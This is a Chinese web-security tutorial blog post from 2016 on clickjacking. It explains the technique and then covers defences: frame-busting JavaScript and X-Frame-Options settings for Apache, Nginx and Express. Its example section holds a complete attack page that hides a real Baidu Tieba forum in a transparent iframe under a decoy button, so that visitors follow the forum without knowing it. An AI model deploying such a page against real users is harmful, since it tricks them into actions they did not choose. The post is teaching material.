---
title: ​【WEB安全】WEB安全基础知识系列-点击劫持（CLICKJACKING）
id: 1036
categories:
  - WEB安全
  - 编程语言
date: 2016-06-10 10:48:44
tags:
---

<span style="color: #585858; font-family: 仿宋; font-size: 12pt;">" Clickjacking （点击劫持）是由互联网安全专家罗伯特·汉森和耶利米·格劳斯曼在 2008 年提出的。 是一种视觉欺骗手段，在 web 端就是 iframe 嵌套一个透明不可见的页面，让用户在不知情的情况下，点击攻击者想要欺骗用户点击的位置。"
</span>

## 1.攻击原理:

<span style="color: #585858;"><span style="font-family: 仿宋;"><span style="font-size: 12pt;">点击劫持（ClickJacking）是一种视觉上的欺骗手段。大概有两种方式，一是攻击者使用一个透明的iframe，覆盖在一个[网页](http://www.07net01.com/tags-%E7%BD%91%E9%A1%B5-0.html)上，然后诱使用户在该页面上进行操作，此时用户将在不知情的情况下点击透明的iframe页面；二是攻击者使用一张[图片](http://www.wredian.com/tags-%E5%9B%BE%E7%89%87-0.html)覆盖在网页，遮挡网页原有位置的含义；</span><span style="color: #069aef; font-size: 9pt;">
</span></span>
![](http://helloword.1kapp.com/wp-content/uploads/2016/06/061016_0248_WEBWEB11.png)</span>

<span style="color: #585858;"><!--more-->
</span><span style="font-family: 宋体; font-size: 12pt;">
</span>

## <span style="font-size: 1.7em;">2.攻击举例</span>

<span style="color: #585858; font-family: 仿宋; font-size: 12pt;">假如我们在[百度](http://www.07net01.com/tags-%E7%99%BE%E5%BA%A6-0.html)有个贴吧，想偷偷让别人关注它。于是我们准备一个页面：
</span>
<div>
<table style="border-collapse: collapse; background: #fabf8f;" border="0"><colgroup> <col style="width: 590px;" /></colgroup>
<tbody valign="top">
<tr>
<td style="padding-left: 7px; padding-right: 7px; border: solid 0.5pt;"><span style="font-size: 7pt;">&lt;!DOCTYPE HTML&gt;
</span><span style="font-size: 7pt;">&lt;html&gt;
</span><span style="font-size: 7pt;">&lt;meta http-equiv="Content-Type" content="text/html; charset=gb2312" /&gt;
</span>

<span style="font-size: 7pt;">&lt;head&gt;
</span>

<span style="font-size: 7pt;">&lt;title&gt;点击劫持&lt;/title&gt;
</span>

<span style="font-size: 7pt;">&lt;style&gt;
</span>

<span style="font-size: 7pt;"> html,body,iframe{
</span>

<span style="font-size: 7pt;"> display: block;
</span>

<span style="font-size: 7pt;"> height: 100%;
</span>

<span style="font-size: 7pt;"> width: 100%;
</span>

<span style="font-size: 7pt;"> margin: 0;
</span>

<span style="font-size: 7pt;"> padding: 0;
</span>

<span style="font-size: 7pt;"> border:none;
</span>

<span style="font-size: 7pt;"> }
</span>

<span style="font-size: 7pt;"> iframe{
</span>

<span style="font-size: 7pt;"> opacity:0;
</span>

<span style="font-size: 7pt;"> filter:alpha(opacity=0);
</span>

<span style="font-size: 7pt;"> position:absolute;
</span>

<span style="font-size: 7pt;"> z-index:2;
</span>

<span style="font-size: 7pt;"> }
</span>

<span style="font-size: 7pt;"> button{
</span>

<span style="font-size: 7pt;"> position:absolute;
</span>

<span style="font-size: 7pt;"> top: 315px;
</span>

<span style="font-size: 7pt;"> left: 462px;
</span>

<span style="font-size: 7pt;"> z-index: 1;
</span>

<span style="font-size: 7pt;"> width: 72px;
</span>

<span style="font-size: 7pt;"> height: 26px;
</span>

<span style="font-size: 7pt;"> }
</span>

<span style="font-size: 7pt;">&lt;/style&gt;
</span>

<span style="font-size: 7pt;">&lt;/head&gt;
</span>

<span style="font-size: 7pt;"> &lt;body&gt;
</span>

<span style="font-size: 7pt;"> 那些不能说的秘密
</span>

<span style="font-size: 7pt;"> &lt;button&gt;查看详情&lt;/button&gt;
</span>

<span style="font-size: 7pt;"> &lt;iframe src="http://tieba.baidu.com/f?kw=%C3%C0%C5%AE"&gt;&lt;/iframe&gt;
</span>

<span style="font-size: 7pt;"> &lt;/body&gt;
</span>

<span style="font-size: 7pt;">&lt;/html</span></td>
</tr>
</tbody>
</table>
</div>

<span style="color: #585858; font-family: 仿宋; font-size: 12pt;">PS：页面看起来就这样，当然真正攻击的页面会精致些，不像这么简陋。
</span>

<span style="color: #585858; font-family: 仿宋; font-size: 12pt;">2\. 网址传播出去后，用户手贱点击了查看详情后，其实就会点到关注按钮。
</span>

![](http://helloword.1kapp.com/wp-content/uploads/2016/06/061016_0248_WEBWEB21.png)<span style="color: #444444; font-family: 微软雅黑; font-size: 13pt;">
</span>

<span style="color: #585858; font-family: 仿宋; font-size: 12pt;">PS：可以把iframe透明设为0.3看下实际点到的东西。
</span>

<span style="color: #585858; font-family: 仿宋; font-size: 12pt;">3\. 这样贴吧就多了一个粉丝了。
</span>

![](http://helloword.1kapp.com/wp-content/uploads/2016/06/061016_0248_WEBWEB31.png)<span style="color: #444444; font-family: 微软雅黑; font-size: 13pt;">
</span>

## 4.漏洞防御:

### Client Side Mitigations（客户端防护）

<div>
<table style="border-collapse: collapse; background: #fabf8f;" border="0"><colgroup> <col style="width: 590px;" /></colgroup>
<tbody valign="top">
<tr>
<td style="padding-left: 7px; padding-right: 7px; border: solid 0.5pt;"><span style="font-size: 7pt;">**NoScript plugin
**</span><span style="font-size: 7pt;">这是一种简单的一种防御方法，就是在浏览器层面阻止js的运行。FireFox的Noscript插件就可以做到这一点。这个插件有一个选项可以使用户免于遭受clickjacking的攻击。实现原理是，这个插件阻止JS创建iframe。不过这个插件只能运行于firefox和基于其内核的浏览器。
</span><span style="font-size: 7pt;">**GuardedID
**</span>

<span style="font-size: 7pt;">GuardedID是一个用于保护用户免受包括clickijack在内的诸多攻击的商业软件。GuardedID不直接干扰浏览器的解析，只是把所用iframe强制设为可见。GuardedID只能在IE firefox浏览器下工作。</span></td>
</tr>
</tbody>
</table>
</div>

### Server Side Mitigations（服务端防护）

#### JS防御方案

<div>
<table style="border-collapse: collapse; background: #fabf8f;" border="0"><colgroup> <col style="width: 590px;" /></colgroup>
<tbody valign="top">
<tr>
<td style="padding-left: 7px; padding-right: 7px; border: solid 0.5pt;"><span style="font-size: 7pt;">&lt;script&gt;
</span><span style="font-size: 7pt;">if (self == top) {
</span><span style="font-size: 7pt;"> var theBody = document.getElementsByTagName('body')[0];
</span>

<span style="font-size: 7pt;"> theBody.style.display = "block";
</span>

<span style="font-size: 7pt;">} else {
</span>

<span style="font-size: 7pt;"> top.location = self.location;
</span>

<span style="font-size: 7pt;">}
</span>

<span style="font-size: 7pt;">&lt;/script&gt;</span></td>
</tr>
</tbody>
</table>
</div>

#### X-Frame-Options

<div>
<table style="border-collapse: collapse; background: #fabf8f;" border="0"><colgroup> <col style="width: 590px;" /></colgroup>
<tbody valign="top">
<tr>
<td style="padding-left: 7px; padding-right: 7px; border: solid 0.5pt;"><span style="font-size: 7pt;">X-Frame-Options 共有三个值：
</span><span style="font-size: 7pt;">DENY 任何页面都不能被嵌入到 iframe 或者 frame 中。
</span><span style="font-size: 7pt;">SAMEORIGIN 页面只能被本站页面嵌入到 iframe 或者 frame 中。
</span>

<span style="font-size: 7pt;">ALLOW-FROM uri 页面自能被指定的 Uri 嵌入到 iframe 或 frame 中。
</span>

&nbsp;

<span style="font-size: 7pt;">**Apache 配置 X-Frame-Options
**</span>

&nbsp;

<span style="font-size: 7pt;">在站点配置文件 httpd.conf 中添加如下配置，限制只有站点内的页面才可以嵌入 iframe 。
</span>

<span style="font-size: 7pt;">Header always append X-Frame-Options SAMEORIGIN
</span>

<span style="font-size: 7pt;">配置之后重启 apache 使其生效。该配置方式对 IBM HTTP Server 同样适用。
</span>

<span style="font-size: 7pt;">如果同一 apache 服务器上有多个站点，只想针对一个站点进行配置，可以修改 .htaccess 文件，添加如下内容：
</span>

<span style="font-size: 7pt;">Header append X-FRAME-OPTIONS "SAMEORIGIN"
</span>

&nbsp;

<span style="font-size: 7pt;">**Nginx 配置 X-Frame-Options
**</span>

&nbsp;

<span style="font-size: 7pt;">到 nginx/conf 文件夹下，修改 nginx.conf ，添加如下内容：
</span>

<span style="font-size: 7pt;">add_header X-Frame-Options "SAMEORIGIN";
</span>

<span style="font-size: 7pt;">重启 Nginx 服务。
</span>

&nbsp;

<span style="font-size: 7pt;">**Node Express服务器防止点击劫持劫持
**</span>

&nbsp;

<span style="font-size: 7pt;">npm install helmet --save
</span>

<span style="font-size: 7pt;">var express = require('express');
</span>

<span style="font-size: 7pt;">var helmet = require('helmet');
</span>

<span style="font-size: 7pt;">var app = express();
</span>

<span style="font-size: 7pt;">app.use(helmet.frameguard('sameorigin'));
</span>

<span style="font-size: 7pt;">PS：可以把iframe透明设为0.3看下实际点到的东西。
</span></td>
</tr>
</tbody>
</table>
</div>
<span style="font-size: 12pt;"><span style="color: black; font-family: 仿宋;">**4.总结与思考:**</span><span style="font-family: 宋体;">
</span></span>

*   <span style="color: #585858;"><span style="font-family: 仿宋; font-size: 12pt;">点击劫持核心思想是利用利用隐藏的IFRAME诱骗用户去点击，<span style="color: black;">隐藏的<span style="color: #585858;">IFRAME<span style="color: black;">的链接可共享主域名的COOKIE等信息</span></span></span></span><span style="font-family: 微软雅黑; font-size: 13pt;">
</span></span>
*   <span style="color: #585858;"><span style="font-family: 仿宋; font-size: 12pt;">安全起见，最好在开发时屏蔽IFRAME的调用，迫不得已的情况下，优先考虑使用X-FRAME-OPTION的相应策略</span><span style="color: black; font-family: 微软雅黑; font-size: 13pt;">
</span></span>
<span style="font-size: 12pt;"><span style="color: black; font-family: 仿宋;">**5.引用:**</span><span style="font-family: 宋体;">
</span></span>

*   <span style="color: black;"><span style="font-family: 仿宋; font-size: 12pt;">http://www.07net01.com/2016/03/1339679.html </span><span style="font-family: 微软雅黑; font-size: 13pt;">
</span></span>
*   <span style="color: black;"><span style="font-family: 仿宋; font-size: 12pt;">https://qjzd.net/topic/55a13be30fcea8a4423a2cef</span><span style="font-family: 微软雅黑; font-size: 10pt;">
</span></span>
*   <span style="color: black; font-family: 仿宋; font-size: 12pt;">http://www.freebuf.com/articles/web/22999.html</span>